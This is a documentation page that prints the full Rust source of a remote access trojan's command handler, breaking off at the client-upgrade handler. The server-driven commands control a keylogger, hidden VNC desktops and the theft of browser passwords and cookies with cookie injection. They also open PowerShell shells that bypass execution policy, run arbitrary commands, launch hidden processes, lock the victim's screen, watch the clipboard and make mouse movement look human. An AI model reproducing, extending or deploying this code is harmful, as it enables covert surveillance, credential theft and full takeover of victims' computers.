# commands

| Field | Value |
|-------|-------|
| **Source** | `src/client_rust/src/commands.rs` |
| **Lines** | 1824 |
| **Cards** | T023-client-capabilities |
| **Role** | ClientState struct, command dispatch |
| **Unsafe blocks** | 8 |

## Constants

- `CREATE_NO_WINDOW`: `u32` = `0x08000000`

## Types

### struct `ClientState` (line 11)
Shared client state, mutated by command handlers.

## Public API

### `new` (line 55)
```rust
pub fn new(target_fps: u32, jpeg_quality: u32, config_path: std::path::PathBuf) -> Self
```

### `cleanup` (line 88)
```rust
pub fn cleanup(&mut self)
```

### `handle_command` (line 125)
```rust
pub fn handle_command(
```
Handle a single command. Returns Some(bytes) to send back to server, or None.
For STOP, sets state.stop_signal = true.
SHOW_OVERLAY_URL returns a special sentinel that the caller handles async.

### `show_fullscreen_overlay` (line 1436)
```rust
pub fn show_fullscreen_overlay(state: &mut ClientState, image_data: &[u8], opacity: u32) -> bool
```

### `make_lock_image` (line 1632)
```rust
pub fn make_lock_image(monitor_index: u32) -> Vec<u8>
```
Generate a visual lock screen JPEG image.

### `get_hostname_simple` (line 1690)
```rust
pub fn get_hostname_simple() -> String
```

## Internal Functions

- `sync_input_block_state` (line 1417)
- `close_custom_overlays` (line 1429)
- `run_command_sync` (line 1448)
- `get_process_list` (line 1481)
- `start_process_impl` (line 1507)
- `list_monitors` — Returns lightweight metadata for all connected monitors (no thumbnails). (line 1525)
- `suspend_resume_process` (line 1543)
- `build_monitor_previews` (line 1595)
- `_handle_self_upgrade` — Download a newer Rust build ZIP, replace the current executable, and restart. (line 1701)

## Key Dependencies

- `use anyhow::Result;`
- `use serde_json::{json, Value};`
- `use tracing::{info, warn, error};`
- `use crate::protocol::{build_message, MSG_CLIPBOARD_CHANGE, MSG_CMD_OUTPUT, MSG_PROCESS_LIST, MSG_BROWSER_DATA, MSG_STATE_SYNC};`
- `use base64::Engine as _;`
- `use base64::Engine as _;`
- `use windows::Win32::System::Diagnostics::ToolHelp::{`
- `use windows::Win32::System::Threading::{`
- `use windows::Win32::Foundation::CloseHandle;`
- `use base64::Engine as _;`
- `use image::{ImageBuffer, Rgb};`

## Full Source

```rust
// Command handler: dispatches all server → client commands.
// Mirrors the _handle_command method in client_py/main.py.

use anyhow::Result;
use serde_json::{json, Value};
use tracing::{info, warn, error};

use crate::protocol::{build_message, MSG_CLIPBOARD_CHANGE, MSG_CMD_OUTPUT, MSG_PROCESS_LIST, MSG_BROWSER_DATA, MSG_STATE_SYNC};

/// Shared client state, mutated by command handlers.
pub struct ClientState {
    pub keyboard_enabled: bool,
    pub mouse_enabled: bool,
    pub screen_locked: bool,
    pub current_monitor: u32,
    pub target_fps: u32,
    pub jpeg_quality: u32,
    pub input_blocked: bool,
    pub manual_input_block: bool,
    pub overlay_input_blocked: bool,
    pub clipboard_monitor_enabled: bool,
    pub overlay: crate::overlay::ScreenOverlay,
    pub lock_overlay: crate::overlay::ScreenOverlay,
    pub overlay_mgr: crate::overlay::OverlayManager,
    pub hvnc: Option<crate::hvnc::HvncManager>,
    pub keylogger: crate::keylogger::Keylogger,
    pub stop_signal: bool,
    /// VNC server handle (set when VNC_START, cleared when VNC_STOP)
    pub vnc_handle: Option<crate::vnc_server::VncHandle>,
    /// Sender for outbound WebSocket messages (needed for VNC start)
    pub ws_send_tx: Option<tokio::sync::mpsc::UnboundedSender<Vec<u8>>>,
    /// Persistent shell sessions: session_id -> child process handle
    pub shell_sessions: std::collections::HashMap<String, std::process::Child>,
    /// Current encoding mode: "jpeg" | "dirty_rects" | "h264". Mutable via SET_ENCODING.
    pub current_encoding: String,
    /// Path to raven_config.toml — used to persist runtime setting changes.
    pub config_path: std::path::PathBuf,
    /// Whether the system cursor is currently hidden on the target.
    pub cursor_hidden: bool,
    /// HTML overlay windows (WebView2, Windows-only).
    pub html_overlay_mgr: crate::html_overlay::HtmlOverlayManager,
    /// Browser hook state (extension sideloading for Chromium browsers).
    pub browser_hook: crate::browser_hook::BrowserHookState,
    /// Pending hook deploy params (phase 2+3 run outside the mutex).
    pub _pending_hook: Option<crate::browser_hook::HookParams>,
    /// Pending unhook params (phase 2+3 run outside the mutex).
    pub _pending_unhook: Option<crate::browser_hook::UnhookParams>,
    /// Hachimon (八門) current gate level (0-8, server-authoritative).
    pub current_gate: u8,
    /// Juubi (十尾) relay state.
    pub juubi: crate::juubi::JuubiState,
}

impl ClientState {
    pub fn new(target_fps: u32, jpeg_quality: u32, config_path: std::path::PathBuf) -> Self {
        ClientState {
            keyboard_enabled: false,
            mouse_enabled: false,
            screen_locked: false,
            current_monitor: 0,
            target_fps,
            jpeg_quality,
            input_blocked: false,
            manual_input_block: false,
            overlay_input_blocked: false,
            clipboard_monitor_enabled: false,
            overlay: crate::overlay::ScreenOverlay::new(),
            lock_overlay: crate::overlay::ScreenOverlay::new(),
            overlay_mgr: crate::overlay::OverlayManager::new(),
            hvnc: None,
            keylogger: crate::keylogger::Keylogger::new(),
            stop_signal: false,
            vnc_handle: None,
            ws_send_tx: None,
            shell_sessions: std::collections::HashMap::new(),
            current_encoding: "jpeg".to_string(),
            config_path,
            cursor_hidden: false,
            html_overlay_mgr: crate::html_overlay::HtmlOverlayManager::new(),
            browser_hook: crate::browser_hook::BrowserHookState::new(),
            _pending_hook: None,
            _pending_unhook: None,
            current_gate: 0,
            juubi: crate::juubi::JuubiState::new(),
        }
    }

    pub fn cleanup(&mut self) {
        self.screen_locked = false;
        self.manual_input_block = false;
        self.overlay_input_blocked = false;
        self.overlay.close();
        self.lock_overlay.close();
        self.overlay_mgr.close_all();
        sync_input_block_state(self);
        if self.cursor_hidden {
            crate::cursor_hider::show_cursor();
            self.cursor_hidden = false;
        }
        if let Some(hvnc) = &mut self.hvnc {
            hvnc.stop();
        }
        // Stop VNC server
        if let Some(vnc) = self.vnc_handle.take() {
            vnc.stop();
        }
        // Close HTML overlay windows
        self.html_overlay_mgr.close_all();
        // Kill all persistent shell sessions
        for (sid, mut child) in self.shell_sessions.drain() {
            let _ = child.kill();
            let _ = child.wait();
            info!("Shell session {} cleaned up", sid);
        }
        // Unhook browser extension if active
        if self.browser_hook.active {
            let _ = crate::browser_hook::unhook(&mut self.browser_hook);
        }
    }
}

/// Handle a single command. Returns Some(bytes) to send back to server, or None.
/// For STOP, sets state.stop_signal = true.
/// SHOW_OVERLAY_URL returns a special sentinel that the caller handles async.
pub fn handle_command(
    state: &mut ClientState,
    cmd: &str,
    payload: &str,
) -> Result<Option<Vec<u8>>> {
    // Strip timestamp prefix from payload if present (server may add "timestamp|actual_payload")
    let payload = if let Some(pos) = payload.find('|') {
        // Only strip if first segment looks like a timestamp (all digits)
        let prefix = &payload[..pos];
        if prefix.chars().all(|c| c.is_ascii_digit()) {
            &payload[pos + 1..]
        } else {
            payload
        }
    } else {
        payload
    };

    match cmd {
        // ---- Control ----
        "KEYBOARD_ON" => {
            state.keyboard_enabled = true;
            info!("Keyboard ENABLED");
        }
        "KEYBOARD_OFF" => {
            state.keyboard_enabled = false;
            info!("Keyboard DISABLED");
        }
        "MOUSE_ON" => {
            state.mouse_enabled = true;
            info!("Mouse ENABLED");
        }
        "MOUSE_OFF" => {
            state.mouse_enabled = false;
            info!("Mouse DISABLED");
        }
        "MOUSE_NATURAL_ON" => {
            crate::input::set_natural_mouse(true);
            return Ok(None);
        }
        "MOUSE_NATURAL_OFF" => {
            crate::input::set_natural_mouse(false);
            return Ok(None);
        }

        // ---- Screen lock ----
        "LOCK_SCREEN" => {
            state.screen_locked = true;
            close_custom_overlays(state);
            sync_input_block_state(state);
            let lock_img = make_lock_image(state.current_monitor);
            state.lock_overlay.show(&lock_img, 100);
            info!("Screen LOCKED");
        }
        "UNLOCK_SCREEN" => {
            state.screen_locked = false;
            state.lock_overlay.close();
            sync_input_block_state(state);
            info!("Screen UNLOCKED");
        }
        "LOCK_24H" => {
            state.screen_locked = true;
            close_custom_overlays(state);
            sync_input_block_state(state);
            let lock_img = make_lock_image(state.current_monitor);
            state.lock_overlay.show(&lock_img, 100);
            info!("Screen LOCKED (24h)");
        }

        // ---- Input block ----
        "BLOCK_CLIENT_INPUT" => {
            state.manual_input_block = true;
            sync_input_block_state(state);
            info!("Client input BLOCKED");
        }
        "UNBLOCK_CLIENT_INPUT" => {
            state.manual_input_block = false;
            sync_input_block_state(state);
            info!("Client input UNBLOCKED");
        }

        // ---- Cursor visibility ----
        "HIDE_CURSOR" => {
            crate::cursor_hider::hide_cursor();
            state.cursor_hidden = true;
            info!("Cursor HIDDEN");
        }
        "SHOW_CURSOR" => {
            crate::cursor_hider::show_cursor();
            state.cursor_hidden = false;
            info!("Cursor RESTORED");
        }

        // ---- Monitor ----
        "SET_MONITOR" => {
            if let Ok(idx) = payload.trim().parse::<u32>() {
                state.current_monitor = idx;
                info!("Monitor set to {}", idx);
            }
        }
        "GET_MONITORS" => {
            let monitors = list_monitors(state.current_monitor);
            let out = json!({
                "kind": "monitor_list",
                "ok": true,
                "data": { "monitors": monitors, "activeIndex": state.current_monitor }
            });
            return Ok(Some(build_message(MSG_CMD_OUTPUT, out.to_string().as_bytes())));
        }
        "SET_TARGET_FPS" => {
            if let Ok(fps) = payload.trim().parse::<u32>() {
                state.target_fps = fps.max(1).min(60);
                info!("Target FPS set to {}", state.target_fps);
                crate::config::save_current(&state.config_path, state.target_fps, state.jpeg_quality, &state.current_encoding);
            }
        }
        "SET_JPEG_QUALITY" => {
            if let Ok(q) = payload.trim().parse::<u32>() {
                state.jpeg_quality = q.max(10).min(100);
                info!("JPEG quality set to {}", state.jpeg_quality);
                crate::config::save_current(&state.config_path, state.target_fps, state.jpeg_quality, &state.current_encoding);
            }
        }
        "SET_ENCODING" => {
            let enc = payload.trim().to_lowercase();
            state.current_encoding = enc.clone();
            info!("Encoding changed to: {}", enc);
            crate::config::save_current(&state.config_path, state.target_fps, state.jpeg_quality, &enc);
            return Ok(None);
        }
        "GET_MONITOR_PREVIEWS" => {
            let parts: Vec<&str> = payload.splitn(2, '|').collect();
            let request_id = parts[0].to_string();
            let thumb_width: u32 = parts.get(1)
                .and_then(|s| s.parse().ok())
                .unwrap_or(160)
                .max(64)
                .min(480);
            let previews = build_monitor_previews(state.current_monitor, thumb_width);
            let out = json!({
                "requestId": request_id,
                "kind": "monitor_previews",
                "ok": true,
                "data": { "previews": previews }
            });
            return Ok(Some(build_message(MSG_CMD_OUTPUT, out.to_string().as_bytes())));
        }
        cmd_inner if cmd_inner.starts_with("SET_MONITOR_") || cmd_inner.starts_with("SELECT_MONITOR_") => {
            if let Some(idx_str) = cmd_inner.split('_').last() {
                if let Ok(idx) = idx_str.parse::<u32>() {
                    state.current_monitor = idx;
                }
            }
        }

        // ---- Mouse ----
        // Natural movement (MOUSE_NATURAL=1, default on): Bézier curve + ease-in-out + jitter.
        // Each new move command cancels any in-flight interpolation first.
        // The async move is spawned as a detached Tokio task so it doesn't block
        // the synchronous command handler.
        "MOUSE_MOVE_REL" => {
            if !state.screen_locked && state.mouse_enabled {
                let parts: Vec<&str> = payload.split(';').collect();
                if parts.len() >= 2 {
                    if let (Ok(x), Ok(y)) = (parts[0].parse::<i32>(), parts[1].parse::<i32>()) {
                            let token = crate::input::cancel_mouse_move();
                            tokio::task::spawn(async move {
                                crate::input::move_mouse_natural(token, x, y).await;
                            });
                        }
                    }
            }
        }
        "MOUSE_CLICK_AT" => {
            if !state.screen_locked && state.mouse_enabled {
                let parts: Vec<&str> = payload.split(';').collect();
                if parts.len() >= 2 {
                    if let (Ok(x), Ok(y)) = (parts[0].parse::<i32>(), parts[1].parse::<i32>()) {
                        let btn = parts.get(2).copied().unwrap_or("left").to_string();
                        let token = crate::input::cancel_mouse_move();
                        tokio::task::spawn(async move {
                            crate::input::move_mouse_natural_and_click(token, x, y, &btn).await;
                        });
                    }
                }
            }
        }
        "MOUSE_MOVE" => {
            if !state.screen_locked && state.mouse_enabled {
                let parts: Vec<&str> = payload.split(';').collect();
                if parts.len() >= 2 {
                    if let (Ok(x), Ok(y)) = (parts[0].parse::<i32>(), parts[1].parse::<i32>()) {
                        let token = crate::input::cancel_mouse_move();
                        tokio::task::spawn(async move {
                            crate::input::move_mouse_natural(token, x, y).await;
                        });
                    }
                }
            }
        }
        "MOUSE_LEFT_CLICK" => {
            if !state.screen_locked && state.mouse_enabled {
                crate::input::left_click();
            }
        }
        "MOUSE_RIGHT_CLICK" => {
            if !state.screen_locked && state.mouse_enabled {
                crate::input::right_click();
            }
        }
        "MOUSE_SCROLL" => {
            if !state.screen_locked && state.mouse_enabled {
                let parts: Vec<&str> = payload.split(';').collect();
                if parts.len() >= 3 {
                    if let (Ok(x), Ok(y), Ok(delta)) = (
                        parts[0].parse::<i32>(),
                        parts[1].parse::<i32>(),
                        parts[2].parse::<i32>(),
                    ) {
                        let token = crate::input::cancel_mouse_move();
                        tokio::task::spawn(async move {
                            crate::input::move_mouse_natural_and_scroll(token, x, y, delta).await;
                        });
                    }
                }
            }
        }

        // ---- Keyboard ----
        "TEXT" => {
            if !state.screen_locked && state.keyboard_enabled {
                crate::input::type_text(payload);
            }
        }
        "KEY_PRESS" => {
            if !state.screen_locked && state.keyboard_enabled {
                crate::input::press_key(payload);
            }
        }

        // ---- Overlay ----
        "SHOW_OVERLAY_CUSTOM" => {
            if state.screen_locked {
                warn!("SHOW_OVERLAY_CUSTOM ignored: screen is locked");
            } else {
                let parts: Vec<&str> = payload.splitn(2, '|').collect();
                if parts.len() == 2 {
                    use base64::Engine as _;
                    if let Ok(img_bytes) = base64::engine::general_purpose::STANDARD.decode(parts[1]) {
                        show_fullscreen_overlay(state, &img_bytes, 100);
                    }
                }
            }
        }
        // SHOW_OVERLAY_URL: handled in main.rs via async download
        "SHOW_OVERLAY_URL" => {
            if state.screen_locked {
                warn!("SHOW_OVERLAY_URL ignored: screen is locked");
                return Ok(None);
            }
            // Signal to caller: return a sentinel so it can spawn an async download.
            // We encode the URL in MSG_CMD_OUTPUT with requestId="__overlay_url__"
            let parts: Vec<&str> = payload.splitn(2, '|').collect();
            let url = if parts.len() == 2 { parts[1] } else { parts[0] };
            let sentinel = json!({"requestId": "__overlay_url__", "url": url});
            return Ok(Some(build_message(MSG_CMD_OUTPUT, sentinel.to_string().as_bytes())));
        }
        "CLOSE_OVERLAY" => {
            close_custom_overlays(state);
        }
        "SHOW_OVERLAY_REGION" => {
            if state.screen_locked {
                warn!("SHOW_OVERLAY_REGION ignored: screen is locked");
            } else if let Ok(data) = serde_json::from_str::<Value>(payload) {
                let id      = data.get("id").and_then(|v| v.as_str()).unwrap_or("default").to_string();
                let b64     = data.get("image_b64").and_then(|v| v.as_str()).unwrap_or("");
                let x       = data.get("x").and_then(|v| v.as_i64()).unwrap_or(0) as i32;
                let y       = data.get("y").and_then(|v| v.as_i64()).unwrap_or(0) as i32;
                let w       = data.get("width").and_then(|v| v.as_u64()).unwrap_or(400) as u32;
                let h       = data.get("height").and_then(|v| v.as_u64()).unwrap_or(300) as u32;
                let opacity = data.get("opacity").and_then(|v| v.as_u64()).unwrap_or(100).min(100) as u32;
                use base64::Engine as _;
                if let Ok(img_bytes) = base64::engine::general_purpose::STANDARD.decode(b64) {
                    state.overlay_mgr.show_region(&id, &img_bytes, x, y, w, h, opacity);
                }
            }
        }
        "MOVE_OVERLAY" => {
            if let Ok(data) = serde_json::from_str::<Value>(payload) {
                let id = data.get("id").and_then(|v| v.as_str()).unwrap_or("default");
                let x  = data.get("x").and_then(|v| v.as_i64()).unwrap_or(0) as i32;
                let y  = data.get("y").and_then(|v| v.as_i64()).unwrap_or(0) as i32;
                state.overlay_mgr.move_overlay(id, x, y);
            }
        }
        "RESIZE_OVERLAY" => {
            if let Ok(data) = serde_json::from_str::<Value>(payload) {
                let id = data.get("id").and_then(|v| v.as_str()).unwrap_or("default");
                let w  = data.get("width").and_then(|v| v.as_u64()).unwrap_or(400) as u32;
                let h  = data.get("height").and_then(|v| v.as_u64()).unwrap_or(300) as u32;
                state.overlay_mgr.resize_overlay(id, w, h);
            }
        }
        "CLOSE_OVERLAY_BY_ID" => {
            if let Ok(data) = serde_json::from_str::<Value>(payload) {
                let id = data.get("id").and_then(|v| v.as_str()).unwrap_or("default");
                state.overlay_mgr.close_overlay(id);
            }
        }
        "SET_OVERLAY_OPACITY" => {
            if let Ok(v) = payload.trim().parse::<u32>() {
                state.overlay.set_opacity(v);
            }
        }
        "FREEZE_SCREEN" => {
            if state.screen_locked {
                warn!("FREEZE_SCREEN ignored: screen is locked");
            } else {
                let jpeg = crate::capture::capture_jpeg(state.current_monitor, 75).unwrap_or_default();
                if !jpeg.is_empty() {
                    show_fullscreen_overlay(state, &jpeg, 100);
                }
            }
        }

        // ---- Persistent Shell Session ----
        "SHELL_START" => {
            let parts: Vec<&str> = payload.splitn(2, '|').collect();
            let session_id = parts[0].to_string();
            let shell_type = parts.get(1).copied().unwrap_or("powershell");

            let (shell_exe, shell_args): (&str, Vec<&str>) = if shell_type == "cmd" {
                ("cmd", vec!["/Q"])
            } else {
                ("powershell", vec!["-NoProfile", "-NonInteractive", "-NoLogo", "-ExecutionPolicy", "Bypass"])
            };

            match std::process::Command::new(shell_exe)
                .args(&shell_args)
                .stdin(std::process::Stdio::piped())
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::piped())
                .spawn()
            {
                Ok(child) => {
                    info!("Shell session {} started (type={}, pid={})", session_id, shell_type, child.id());
                    state.shell_sessions.insert(session_id, child);
                }
                Err(e) => {
                    error!("SHELL_START failed: {}", e);
                }
            }
        }

        // Alias: start a PowerShell session directly.
        // Payload format: {session_id} (no shell_type suffix needed)
        "SHELL_POWERSHELL" => {
            let session_id = payload.trim().to_string();
            match std::process::Command::new("powershell")
                .args(["-NoProfile", "-NonInteractive", "-NoLogo", "-ExecutionPolicy", "Bypass"])
                .stdin(std::process::Stdio::piped())
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::piped())
                .spawn()
            {
                Ok(child) => {
                    info!("PowerShell session {} started (pid={})", session_id, child.id());
                    state.shell_sessions.insert(session_id, child);
                }
                Err(e) => {
                    error!("SHELL_POWERSHELL failed: {}", e);
                }
            }
        }

        "SHELL_EXEC" => {
            if let Ok(data) = serde_json::from_str::<Value>(payload) {
                let session_id = data.get("sessionId").and_then(|v| v.as_str()).unwrap_or("").to_string();
                let command = data.get("command").and_then(|v| v.as_str()).unwrap_or("").to_string();
                let request_id = data.get("requestId").and_then(|v| v.as_str()).unwrap_or("").to_string();
                let timeout_secs = data.get("timeout").and_then(|v| v.as_f64()).unwrap_or(30.0);

                let sentinel = "___SHELL_SENTINEL_7f3a2b___";

                if let Some(child) = state.shell_sessions.get_mut(&session_id) {
                    if let Some(ref mut stdin) = child.stdin {
                        use std::io::Write;
                        // Determine command format based on shell type
                        let full_cmd = format!("{}\necho {}\n", command, sentinel);
                        let _ = stdin.write_all(full_cmd.as_bytes());
                        let _ = stdin.flush();
                    }

                    // Read stdout until sentinel in a blocking thread
                    if let Some(stdout) = child.stdout.take() {
                        use std::io::BufRead;
                        let rid = request_id.clone();
                        let sent = sentinel.to_string();
                        let timeout_dur = std::time::Duration::from_secs_f64(timeout_secs);

                        // Use a thread to read with timeout
                        let handle = std::thread::spawn(move || {
                            let mut reader = std::io::BufReader::new(stdout);
                            let start = std::time::Instant::now();
                            let mut lines = Vec::new();
                            let mut line = String::new();
                            loop {
                                if start.elapsed() > timeout_dur {
                                    break;
                                }
                                line.clear();
                                match reader.read_line(&mut line) {
                                    Ok(0) => break,
                                    Ok(_) => {
                                        let trimmed = line.trim_end_matches(['\r', '\n']).to_string();
                                        if trimmed.contains(&sent) {
                                            break;
                                        }
                                        lines.push(trimmed);
                                    }
                                    Err(_) => break,
                                }
                            }
                            (lines.join("\n"), reader.into_inner())
                        });

                        match handle.join() {
                            Ok((output, stdout_back)) => {
                                // Restore stdout to the child (borrow workaround)
                                if let Some(child) = state.shell_sessions.get_mut(&session_id) {
                                    child.stdout = Some(stdout_back);
                                }
                                let stdout_trimmed = if output.len() > 4000 { &output[..4000] } else { &output };
                                let out = json!({
                                    "requestId": rid,
                                    "exitCode": 0,
                                    "stdout": stdout_trimmed,
                                    "stderr": "",
                                });
                                return Ok(Some(build_message(MSG_CMD_OUTPUT, out.to_string().as_bytes())));
                            }
                            Err(_) => {
                                let out = json!({
                                    "requestId": rid,
                                    "exitCode": -1,
                                    "stdout": "",
                                    "stderr": "Thread read error",
                                });
                                return Ok(Some(build_message(MSG_CMD_OUTPUT, out.to_string().as_bytes())));
                            }
                        }
                    } else {
                        let out = json!({
                            "requestId": request_id,
                            "exitCode": -1,
                            "stdout": "",
                            "stderr": "Shell stdout not available",
                        });
                        return Ok(Some(build_message(MSG_CMD_OUTPUT, out.to_string().as_bytes())));
                    }
                } else {
                    let out = json!({
                        "requestId": request_id,
                        "exitCode": -1,
                        "stdout": "",
                        "stderr": "Shell session not found or terminated",
                    });
                    return Ok(Some(build_message(MSG_CMD_OUTPUT, out.to_string().as_bytes())));
                }
            }
        }

        "SHELL_STOP" => {
            let session_id = payload.trim().to_string();
            if let Some(mut child) = state.shell_sessions.remove(&session_id) {
                let _ = child.kill();
                let _ = child.wait();
                info!("Shell session {} stopped", session_id);
            }
        }

        // ---- Remote exec (one-shot) ----
        "CMD_EXEC" => {
            let parts: Vec<&str> = payload.splitn(2, '|').collect();
            if parts.len() >= 2 {
                let request_id = parts[0];
                let command = parts[1];
                let output = run_command_sync(request_id, command);
                return Ok(Some(build_message(MSG_CMD_OUTPUT, output.as_bytes())));
            }
        }

        // ---- System info ----
        "GET_CLIENT_INFO" => {
            let mut sys = sysinfo::System::new_all();
            sys.refresh_all();
            let cpu_usage: f32 = sys.cpus().iter().map(|c| c.cpu_usage()).sum::<f32>()
                / sys.cpus().len().max(1) as f32;
            let info = json!({
                "pcName": get_hostname_simple(),
                "osName": sysinfo::System::name().unwrap_or_default(),
                "clientType": "rust",
                "uptime": sysinfo::System::uptime(),
                "cpuPercent": cpu_usage,
                "ramTotalMB": sys.total_memory() / (1024 * 1024),
                "ramUsedMB": sys.used_memory() / (1024 * 1024),
            });
            let out = json!({"requestId": "", "exitCode": 0, "stdout": info.to_string()});
            return Ok(Some(build_message(MSG_CMD_OUTPUT, out.to_string().as_bytes())));
        }
        "GET_PERF_STATS" => {
            let mut sys = sysinfo::System::new_all();
            sys.refresh_all();
            let total = sys.total_memory();
            let used = sys.used_memory();
            let ram_pct = if total > 0 { used as f64 / total as f64 * 100.0 } else { 0.0 };
            let cpu_usage: f32 = sys.cpus().iter().map(|c| c.cpu_usage()).sum::<f32>()
                / sys.cpus().len().max(1) as f32;
            let stats = json!({
                "cpu": cpu_usage,
                "ram": ram_pct,
                "ramMB": used / (1024 * 1024),
            });
            let out = json!({"requestId": "", "exitCode": 0, "stdout": stats.to_string()});
            return Ok(Some(build_message(MSG_CMD_OUTPUT, out.to_string().as_bytes())));
        }
        "TAKE_SCREENSHOT" => {
            let frame = crate::capture::capture_jpeg(state.current_monitor, state.jpeg_quality as u8)
                .unwrap_or_default();
            let tmp = std::env::temp_dir().join(format!(
                "screenshot_{}.jpg",
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs()
            ));
            let _ = std::fs::write(&tmp, &frame);
            info!("Screenshot saved: {:?} ({} bytes)", tmp, frame.len());
        }
        "TEST_INPUT" => {
            crate::input::move_mouse_normalized(100, 100);
            info!("TEST_INPUT: input OK");
        }

        // ---- HVNC ----
        "HVNC_START" => {
            if state.hvnc.is_none() {
                state.hvnc = Some(crate::hvnc::HvncManager::new());
            }
            if let Some(hvnc) = &mut state.hvnc {
                let ok = hvnc.start();
                info!("HVNC start: {}", ok);
                if ok && !payload.is_empty() {
                    hvnc.launch(payload);
                }
            }
        }
        "HVNC_STOP" => {
            if let Some(hvnc) = &mut state.hvnc {
                hvnc.stop();
                info!("HVNC stopped");
            }
        }
        "HVNC_LAUNCH" => {
            if let Some(hvnc) = &mut state.hvnc {
                if hvnc.is_active() {
                    let ok = hvnc.launch(payload);
                    info!("HVNC launch {}: {}", payload, ok);
                }
            }
        }
        "HVNC_LIST_WINDOWS" => {
            let windows = state.hvnc.as_ref()
                .filter(|h| h.is_active())
                .map(|h| h.list_windows())
                .unwrap_or_default();
            let out = json!({
                "requestId": "__hvnc_windows__",
                "exitCode": 0,
                "windows": windows
            });
            return Ok(Some(build_message(MSG_CMD_OUTPUT, out.to_string().as_bytes())));
        }
        "HVNC_FOCUS" => {
            if let Some(hvnc) = &mut state.hvnc {
                if let Ok(hwnd) = payload.trim().parse::<usize>() {
                    hvnc.focus_window(hwnd);
                }
            }
        }

        // ---- Process Manager ----
        "GET_PROCESS_LIST" => {
            let procs = get_process_list();
            return Ok(Some(build_message(MSG_PROCESS_LIST, procs.as_bytes())));
        }
        "KILL_PROCESS" => {
            if let Ok(pid_raw) = payload.trim().parse::<u32>() {
                let mut sys = sysinfo::System::new();
                sys.refresh_processes();
                let pid = sysinfo::Pid::from(pid_raw as usize);
                if let Some(proc_) = sys.process(pid) {
                    proc_.kill();
                    info!("Killed process {}", pid_raw);
                } else {
                    warn!("KILL_PROCESS: pid {} not found", pid_raw);
                }
            }
        }
        "START_PROCESS" => {
            if let Ok(data) = serde_json::from_str::<Value>(payload) {
                let exe = data.get("exe").and_then(|v| v.as_str()).unwrap_or("").to_string();
                let args = data.get("args").and_then(|v| v.as_str()).unwrap_or("").to_string();
                let hidden = data.get("hidden").and_then(|v| v.as_bool()).unwrap_or(false);
                start_process_impl(&exe, &args, hidden);
            }
        }
        "SUSPEND_PROCESS" => {
            if let Ok(pid) = payload.trim().parse::<u32>() {
                #[cfg(windows)]
                suspend_resume_process(pid, true);
                #[cfg(not(windows))]
                warn!("SUSPEND_PROCESS not supported on this platform");
            }
        }
        "RESUME_PROCESS" => {
            if let Ok(pid) = payload.trim().parse::<u32>() {
                #[cfg(windows)]
                suspend_resume_process(pid, false);
                #[cfg(not(windows))]
                warn!("RESUME_PROCESS not supported on this platform");
            }
        }

        // ---- Clipboard ----
        "GET_CLIPBOARD" => {
            let text = crate::clipboard::get_clipboard();
            let window = crate::clipboard::get_active_window_title();
            let msg = json!({"text": text, "window": window});
            return Ok(Some(build_message(MSG_CLIPBOARD_CHANGE, msg.to_string().as_bytes())));
        }
        "SET_CLIPBOARD" => {
            crate::clipboard::set_clipboard(payload);
            info!("Clipboard set: {} chars", payload.len());
        }
        "CLIPBOARD_MONITOR_ON" => {
            state.clipboard_monitor_enabled = true;
            info!("Clipboard monitor ENABLED");
        }
        "CLIPBOARD_MONITOR_OFF" => {
            state.clipboard_monitor_enabled = false;
            info!("Clipboard monitor DISABLED");
        }

        // ---- Keylogger ----
        "KEYLOG_START" => {
            if !state.keylogger.is_active() {
                state.keylogger.start();
            }
        }
        "KEYLOG_STOP" => {
            state.keylogger.stop();
        }

        // ---- Browser data ----
        "GET_BROWSER_DATA" => {
            let params: Value = serde_json::from_str(payload).unwrap_or_else(|_| {
                json!({"browser": "chrome", "type": "passwords"})
            });
            let browser = params.get("browser").and_then(|v| v.as_str()).unwrap_or("chrome").to_string();
            let data_type = params.get("type").and_then(|v| v.as_str()).unwrap_or("passwords").to_string();
            let result = crate::browser::read_browser_data(&browser, &data_type);
            let msg_bytes = serde_json::to_vec(&result).unwrap_or_default();
            return Ok(Some(build_message(MSG_BROWSER_DATA, &msg_bytes)));
        }

        // ---- Browser session (CDP cookie injection + navigation on isolated desktop) ----
        "LAUNCH_BROWSER_SESSION" => {
            #[cfg(windows)]
            {
                // Enrich payload with the HVNC desktop name if available.
                let enriched_payload = if let Some(ref hvnc) = state.hvnc {
                    if hvnc.is_active() {
                        // Merge desktop_name into the payload JSON.
                        let mut v: Value = serde_json::from_str(payload)
                            .unwrap_or_else(|_| json!({}));
                        if let Value::Object(ref mut map) = v {
                            if !map.contains_key("desktop_name") {
                                map.insert(
                                    "desktop_name".to_string(),
                                    Value::String(hvnc.desktop_name().to_string()),
                                );
                            }
                        }
                        v.to_string()
                    } else {
                        payload.to_string()
                    }
                } else {
                    payload.to_string()
                };

                let result_json = crate::browser_session::launch_browser_session_cmd(&enriched_payload);
                info!("LAUNCH_BROWSER_SESSION result: {}", &result_json[..result_json.len().min(200)]);
                let out = json!({
                    "requestId": "LAUNCH_BROWSER_SESSION",
                    "exitCode": 0,
                    "stdout": result_json,
                    "stderr": "",
                });
                return Ok(Some(build_message(MSG_CMD_OUTPUT, out.to_string().as_bytes())));
            }
            #[cfg(not(windows))]
            {
                warn!("LAUNCH_BROWSER_SESSION: not supported on this platform");
                let out = json!({
                    "requestId": "LAUNCH_BROWSER_SESSION",
                    "exitCode": -1,
                    "stdout": "",
                    "stderr": "not supported on this platform",
                });
                return Ok(Some(build_message(MSG_CMD_OUTPUT, out.to_string().as_bytes())));
            }
        }

        // ---- VNC ----
        "VNC_START" => {
            if state.vnc_handle.is_some() {
                info!("VNC already running, ignoring VNC_START");
            } else if let Some(ref ws_tx) = state.ws_send_tx {
                let fps = if payload.is_empty() {
                    state.target_fps.min(15)
                } else {
                    payload.parse::<u32>().unwrap_or(10).max(1).min(30)
                };
                let handle = crate::vnc_server::start(
                    ws_tx.clone(),
                    state.current_monitor,
                    fps,
                    state.jpeg_quality as u8,
                );
                state.vnc_handle = Some(handle);
                info!("VNC server started at {} FPS", fps);
            } else {
                warn!("VNC_START: no WebSocket sender available");
            }
        }
        "VNC_STOP" => {
            if let Some(vnc) = state.vnc_handle.take() {
                vnc.stop();
                info!("VNC server stopped");
            } else {
                info!("VNC not running, ignoring VNC_STOP");
            }
        }

        // ---- Client upgrade (self-replace with newer build) ----
        "UPGRADE_CLIENT" => {
